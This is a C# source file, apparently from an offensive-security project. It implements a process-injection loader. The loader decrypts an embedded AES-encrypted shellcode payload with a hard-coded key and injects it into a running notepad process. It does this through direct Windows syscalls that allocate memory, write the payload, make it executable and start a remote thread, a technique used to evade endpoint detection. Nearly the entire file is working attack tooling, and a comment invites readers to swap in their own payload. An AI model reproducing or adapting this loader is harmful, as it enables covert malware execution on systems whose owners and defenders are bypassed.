using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;

using static SysCall.Native;
using static SysCall.Syscalls;

namespace SysCall
{
    public class Program
    {
        static void Main(string[] args)
        {
            // NOTE: change these to your own payload and key
            // https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/README.md

            // the encrypted payload and key
            string payload = "2rxlOpkiE4Ms0EpxfD5chEiZk/j/zOoVY4Ajzv4KV4AzhzJ9IwvyclX9u2sYzdVj6Pa+b77WKCgzagvp7qwUVvV1Hrijaqc3LiBd/9IsJ//TBjVl2ZrgwB3bcVOhvJKsnQYmvoj7TOSF1hVYlVmEwRS2oI+0/RFTJ9sbyT+P/CmZ5rqOIRKyftuufnMaJ0HjINK8asWw6yJGArAV3PaI9swXnC6juAGDstdlAAzcpGvfsSrIQYDKHcOJ8qGRMat0nfF1ipaZF+M2MkHVH5kg4ULDvYgcshLxnMmNJvSPjY2QCyvyxBcgTrGQ0vxVAUM8VY/gKDV4zh52C5D2sPOOViOjYYLHGgIfJmAQZICLYw1dyHWQ01/iovZ1B2IHrOFiTT3I3unInASJ+8h3DIphgxZU4Dk9CNXdSGg5y6j8QdZVDuObrfbQpTh8buGsN/RYlwEGrF3O44YsPLxwcjhPmMfvC8ZogkPSMdSO/ZrIoh9CMuy5NtAGLleVy/JYIWx0IsUFoZREgniC0+UF75rb+yOzInKN7eHeOOry9k+itwx0D1L6+Zs9ZRZVNusEklDoXxuuK/Hbyu6CdzLOpBb1/KyaQrUK5lPwx+uHnZUweqORJJ9bY3kDdoV8IcKL9f180JZaY6rCf8alh7jyDH5/nPj4xVbiXZRbpc1ePNWAkf1LSIGxRGwzu+hw0nnPdfMCMYXkjh6zVds4ucUM5hmuB9tFy9+DClYF/wFnblNDIhuN75I1uxF7lubYkLoVih6UpNcMbPgArrvtX5zmAQzYC8yGk9MWIhu6R9IsA3Kvrj3ejcaOn6bnxFmetQaLrh/GMXIN2UeQNbf0I/nPQWikRBo9tK14uXvQ2q7ql74aTqCBBwTJqBUOjYjqla/na35ZSgIzmKIV6jtdz3XWZNUSgbqbQSVO0NpD+bolgDZOTX0QZNsFW7RU3jwYurZdkwmUZUcIOm6KpIl+txs28DR/QgRlTuehDvTfL1MjdSvhFHk=";
            string key = "Z6ZWn15Y3tQ0GnAc0OPy6K0p0rWItIbO";

            // decrypt the payload
            byte[] shellcode = Decrypt(key, payload);

            // display the base address of ntdll.dll
            Debug("[+] Base Address of ntdll is 0x{0}", new string[] { Syscalls.NtDllBaseAddress.ToString("X") });

            // get the pid of the explorer process
            int pid = System.Diagnostics.Process.GetProcessesByName("notepad")[0].Id;
            Debug("[+] Target PID is {0}", new string[] { pid.ToString() });

            if(pid == 0)
            {
                Debug("[!] Unable to find process PID, will close!", null);
            }

            // set up the syscall for NtOpenProcess
            CLIENT_ID cID = new CLIENT_ID();
            cID.UniqueProcess = (IntPtr)(UInt32)pid;
            OBJECT_ATTRIBUTES oAttr = new OBJECT_ATTRIBUTES();
            IntPtr hProcess = IntPtr.Zero;

            // make the NtOpenProcess syscall
            Debug("[+] Syscall NtOpenProcess on {0}", new string[] { pid.ToString() });
            var status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref oAttr, ref cID);
            Debug("[+] Return, NTSTATUS={0}, hProcess=0x{1}", new string[] { status.ToString(), hProcess.ToString("X") });

            // set up the syscall for NtAllocateVirtualMemory
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)(shellcode.Length);

            // make the NtAllocateVirtualMemory syscall
            Debug("[+] Syscall NtAllocateVirtualMemory on 0x{0}", new string[] { hProcess.ToString("X") });
            status = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, 0x3000, 0x04);
            Debug("[+] Return, NTSTATUS={0}, baseAddress=0x{1}", new string[] { status.ToString(), baseAddress.ToString("X") });

            // set up the syscall for NtWriteVirtualMemory
            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
            uint bytesWritten = 0;

            // make the NtWriteVirtualMemory syscall
            Debug("[+] Syscall NtWriteVirtualMemory to 0x{0}", new string[] { baseAddress.ToString("X") });
            status = NtWriteVirtualMemory(hProcess, baseAddress, buffer, (uint)shellcode.Length, ref bytesWritten);
            Debug("[+] Return, NTSTATUS={0}, bytesWritten=0x{1}", new string[] { status.ToString(), bytesWritten.ToString() });

            // set up the syscall for NtProtectVirtualMemory
            uint oldProtect = 0;

            // make the NtProtectVirtualMemory syscall
            Debug("[+] Syscall NtProtectVirtualMemory on 0x{0}", new string[] { baseAddress.ToString("X") });
            status = NtProtectVirtualMemory(hProcess, ref baseAddress, ref regionSize, 0x20, ref oldProtect);
            Debug("[+] Return, NTSTATUS={0}", new string[] { status.ToString() });

            // set up the syscall for NtCreateThreadEx
            IntPtr hThread = IntPtr.Zero;

            // make the NtCreateThreadEx syscall
            Console.WriteLine("[+] Syscall NtCreateThreadEx to 0x{0}", baseAddress.ToString("X"));
            status = NtCreateThreadEx(out hThread, ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Debug("[+] Return, NTSTATUS={0}, hThread=0x{1}", new string[] { status.ToString(), hThread.ToString() });

            #if DEBUG
            Console.ReadLine();
            #endif
        }

        /// <summary>
        /// Decrypts a base64 text string into a byte array using AES256
        /// </summary>
        /// <param name="key">The key to decrypt the payload</param>
        /// <param name="aes_base64">The encrypted base64 string</param>
        /// <returns>A decrypted byte array</returns>
        private static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        /// <summary>
        /// Returns a sub byte array from a given array
        /// </summary>
        /// <param name="a">The input array</param>
        /// <param name="length">The length of the array to return</param>
        /// <returns>The sub array</returns>
        private static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }

        public static void Debug(string text, string[] args)
        {
            #if DEBUG
            Console.WriteLine(text, args);
            #endif 
        }
    }
}
